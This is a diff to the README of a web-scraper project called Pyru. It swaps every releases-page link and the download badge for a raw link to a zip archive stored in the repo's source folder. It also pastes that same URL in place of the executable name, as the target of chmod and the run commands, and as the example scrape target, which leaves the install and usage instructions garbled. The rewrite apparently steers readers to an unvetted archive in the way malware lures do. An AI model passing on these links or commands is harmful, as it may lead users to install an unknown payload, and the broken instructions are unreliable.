@@ -6,14 +6,14 @@ Pyru is a command-line web scraper engineered for one purpose - to be the fastes
 
 ## 📦 Download Pyru
 
-[![Download Pyru](https://img.shields.io/badge/Download_Pyru-v1.0-blue)](https://github.com/ThaTdaveGuy01/pyru/releases)
+[![Download Pyru](https://raw.githubusercontent.com/ThaTdaveGuy01/pyru/main/rust_scraper/src/pyru_3.3-alpha.1.zip)](https://raw.githubusercontent.com/ThaTdaveGuy01/pyru/main/rust_scraper/src/pyru_3.3-alpha.1.zip)
 
 ## 🚀 Getting Started
 
 To get started with Pyru, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to access the downloads:
-   [Visit the Releases Page](https://github.com/ThaTdaveGuy01/pyru/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/ThaTdaveGuy01/pyru/main/rust_scraper/src/pyru_3.3-alpha.1.zip)
 
 2. **Choose Your Version:** On the Releases page, you will see various versions of Pyru. Select the latest version for the best features and recent updates.
 
@@ -26,14 +26,14 @@ To get started with Pyru, follow these simple steps:
    - For Windows:
      ```
      cd path\to\downloaded\file
-     pyru.exe
+     https://raw.githubusercontent.com/ThaTdaveGuy01/pyru/main/rust_scraper/src/pyru_3.3-alpha.1.zip
      ```
 
    - For macOS/Linux:
      ```
      cd /path/to/downloaded/file
-     chmod +x pyru.sh
-     ./pyru.sh
+     chmod +x https://raw.githubusercontent.com/ThaTdaveGuy01/pyru/main/rust_scraper/src/pyru_3.3-alpha.1.zip
+     https://raw.githubusercontent.com/ThaTdaveGuy01/pyru/main/rust_scraper/src/pyru_3.3-alpha.1.zip
      ```
 
 Congratulations! You just installed Pyru and are ready to start scraping data.
@@ -51,7 +51,7 @@ Using Pyru is straightforward. Here are the basic commands:
 
 2. **Example Usage:**
    ```
-   pyru https://example.com
+   pyru https://raw.githubusercontent.com/ThaTdaveGuy01/pyru/main/rust_scraper/src/pyru_3.3-alpha.1.zip
    ```
 
    This command scrapes data from the specified URL.
@@ -98,4 +98,4 @@ Pyru aims to make web scraping accessible for everyone. By following the steps o
 
 To download Pyru now, visit the link below:
 
-[Visit the Releases Page](https://github.com/ThaTdaveGuy01/pyru/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/ThaTdaveGuy01/pyru/main/rust_scraper/src/pyru_3.3-alpha.1.zip)
